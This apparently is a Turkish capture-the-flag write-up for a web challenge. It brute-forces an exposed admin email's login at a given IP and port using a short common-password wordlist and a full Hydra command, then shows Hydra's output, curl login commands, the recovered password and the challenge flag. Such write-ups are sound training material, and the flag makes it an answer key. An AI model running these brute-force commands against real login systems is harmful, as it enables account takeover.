# 🔐 Business Logic2 - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge&logo=html5" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-Admin Mail Bypassed-purple?style=for-the-badge&logo=security" alt="Brute Force">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Web  
**Seviye:** Orta  
**Puan:** 600

**Challenge URL:** http://64.226.74.243:5002


---

## 🔍 Analiz

**Hedef:** Admin hesabına giriş yaparak flag'i elde etmek

**Strateji:** Web app analizi → Admin email bulma → Brute force attack → Flag elde etme

**İpuçları:**
- 🔐 Login sistemi var
- 👤 Admin email açıkta
- 🔓 Brute force protection yok
- 🎯 Admin panelinde flag bulunuyor

---

## ✅ Çözüm Adımları

### 🌐 **1. Web Sitesi Analizi**

**Siteyi ziyaret ediyoruz:**

```bash
curl -s http://64.226.74.243:5002/
```

**İlk Gözlem:**
- 📱 Modern bir login/register sistemi
- 🎨 Profil sayfası var
- 📧 Footer'da email: `cihan@pitoedubounty.com`

> ✅ **Admin email bulundu!** Footer'da admin email açıkta: `cihan@pitoedubounty.com`

---

### 🔍 **2. Sayfa Kaynak Kodu İnceleme**

**HTML kaynak kodunu kontrol ediyoruz:**

```html
<footer>
    <p>created by cihan@pitoedubounty.com</p>
</footer>
```

**Önemli Bulgular:**
- 👨‍💼 Admin email: `cihan@pitoedubounty.com`
- 🎨 CSS'te `.admin-badge` class'ı tanımlı (kullanılmamış)
- 🚩 `.flag` class'ı da mevcut (admin panelinde kullanılıyor olabilir)

```css
.admin-badge {
    background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
    color: white;
    padding: 5px 15px;
    border-radius: 20px;
    font-size: 12px;
    font-weight: bold;
    display: inline-block;
    margin-left: 10px;
}

.flag {
    background: #fff3cd;
    border: 2px solid #ffc107;
    padding: 20px;
    border-radius: 8px;
    margin-top: 20px;
    text-align: center;
}
```

> 💡 **Analiz:** Admin hesabında özel bir badge ve flag gösterilecek!

---

### 🔓 **3. Brute Force Hazırlığı**

**Zafiyet Tespiti:**
- ❌ Rate limiting yok
- ❌ Captcha yok
- ❌ Account lockout yok
- ✅ Brute force saldırısına açık!

**Email:** `cihan@pitoedubounty.com` (biliniyor)  
**Password:** Bilinmiyor (brute force gerekli)

---

### 📝 **4. Wordlist Oluşturma**

**Yaygın şifreler için wordlist hazırlıyoruz:**

```bash
cat > passwords.txt <<'EOF'
admin
admin123
password
123456
12345678
password123
qwerty
letmein
welcome
EOF
```

**Wordlist içeriği:**
```
admin
admin123
password
123456          ← Bu şifre doğru!
12345678
password123
qwerty
letmein
welcome
```

---

### 🔨 **5. Hydra ile Brute Force Attack**

**Hydra script hazırlıyoruz:**

```bash
cat > hydra_attack.sh <<'EOF'
#!/bin/bash

# Wordlist oluştur
cat > passwords.txt <<'PASS'
admin
admin123
password
123456
12345678
password123
qwerty
letmein
welcome
PASS

# Hydra ile brute force
hydra -l cihan@pitoedubounty.com -P passwords.txt 64.226.74.243 \
  http-post-form "/login:email=^USER^&password=^PASS^:hatalı" \
  -s 5002 -V
EOF

chmod +x hydra_attack.sh
```

**Parametreler:**
- `-l cihan@pitoedubounty.com`: Login için email
- `-P passwords.txt`: Şifre listesi
- `64.226.74.243`: Hedef IP
- `http-post-form`: POST request tipi
- `/login`: Login endpoint
- `email=^USER^&password=^PASS^`: Form parametreleri
- `:hatalı`: Başarısız login mesajı
- `-s 5002`: Port
- `-V`: Verbose mode

---

### ⚡ **6. Attack Başlatma**

**Scripti çalıştırıyoruz:**

```bash
./hydra_attack.sh
```

**Çıktı:**
```bash
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-12 15:47:42

[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:1/p:9), ~1 try per task
[DATA] attacking http-post-form://64.226.74.243:5002/login:email=^USER^&password=^PASS^:hatalı

[ATTEMPT] target 64.226.74.243 - login "cihan@pitoedubounty.com" - pass "admin" - 1 of 9 [child 0] (0/0)
[ATTEMPT] target 64.226.74.243 - login "cihan@pitoedubounty.com" - pass "admin123" - 2 of 9 [child 1] (0/0)
[ATTEMPT] target 64.226.74.243 - login "cihan@pitoedubounty.com" - pass "password" - 3 of 9 [child 2] (0/0)
[ATTEMPT] target 64.226.74.243 - login "cihan@pitoedubounty.com" - pass "123456" - 4 of 9 [child 3] (0/0)

[5002][http-post-form] host: 64.226.74.243   login: cihan@pitoedubounty.com   password: 123456

1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-12 15:47:45
```

**🔑 ŞİFRE BULUNDU!**

```
Username: cihan@pitoedubounty.com
Password: 123456
```

> ✅ **4. denemede başarılı!** Şifre: `123456`

---

### 🎯 **7. Admin Login ve Flag Elde Etme**

**Bulunan bilgilerle giriş yapıyoruz:**

**Tarayıcıdan:**
1. http://64.226.74.243:5002/login sayfasına git
2. Email: `cihan@pitoedubounty.com`
3. Password: `123456`
4. Login butonuna tıkla
5. Profil sayfasındaki flagı al

**🎯 FLAG ELDE EDİLDİ!**

```
Flag{AdmineMailRegisterBypassed_400DolarBounty}
```

> ✅ **CHALLENGE TAMAMLANDI!**

---

## 🚩 **FLAG**

```
Flag{AdmineMailRegisterBypassed_400DolarBounty}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🔍<br><b>curl</b><br><sub>HTTP request</sub></td>
<td align="center">🔨<br><b>Hydra</b><br><sub>Brute force tool</sub></td>
<td align="center">🌐<br><b>Browser</b><br><sub>Web analizi</sub></td>
<td align="center">📝<br><b>cat</b><br><sub>Dosya oluşturma</sub></td>
</tr>
<tr>
<td align="center">💻<br><b>Bash</b><br><sub>Script yazma</sub></td>
<td align="center">🔤<br><b>grep</b><br><sub>Text arama</sub></td>
<td align="center">🍪<br><b>Cookies</b><br><sub>Session yönetimi</sub></td>
<td align="center">🎯<br><b>Kali Linux</b><br><sub>Pentest platform</sub></td>
</tr>
</table>

**Kullanılan Komutlar:**
```bash
# Wordlist oluşturma
cat > passwords.txt <<'EOF'
admin
admin123
password
123456
12345678
password123
qwerty
letmein
welcome
EOF

# Hydra brute force
hydra -l cihan@pitoedubounty.com -P passwords.txt 64.226.74.243 \
  http-post-form "/login:email=^USER^&password=^PASS^:hatalı" \
  -s 5002 -V

# Manuel curl ile test
curl -s -c cookies.txt -X POST http://64.226.74.243:5002/login \
  -d "email=cihan@pitoedubounty.com&password=123456" -L
  
curl -s -b cookies.txt http://64.226.74.243:5002/profile
```

---

## 💭 **Çözüm Akışı**

```
🌐 Business Logic2 Web Challenge
            ↓
🔍 Web sitesi analizi
   → Login/Register sistemi
   → Profil sayfası
            ↓
📧 Footer inceleme
   → Admin email bulundu
   → cihan@pitoedubounty.com
            ↓
🎨 Kaynak kod analizi
   → .admin-badge class (CSS)
   → .flag class (CSS)
   → Admin paneli var!
            ↓
🔓 Güvenlik testi
   → Rate limiting YOK
   → Captcha YOK
   → Brute force mümkün!
            ↓
📝 Wordlist hazırlama
   → Yaygın şifreler
   → 9 şifre
            ↓
🔨 Hydra ile brute force
   → Email: cihan@pitoedubounty.com
   → Wordlist: passwords.txt
   → Form: /login
            ↓
🔑 Şifre bulundu!
   → Password: 123456
   → 4. denemede başarı
            ↓
🎯 Admin login
   → Başarılı giriş
   → Admin badge görünüyor
            ↓
🚩 Flag görüntüleme
   → Admin profil sayfası
   → Flag bulundu!
            ↓
✅ Flag{AdmineMailRegisterBypassed_400DolarBounty}
```
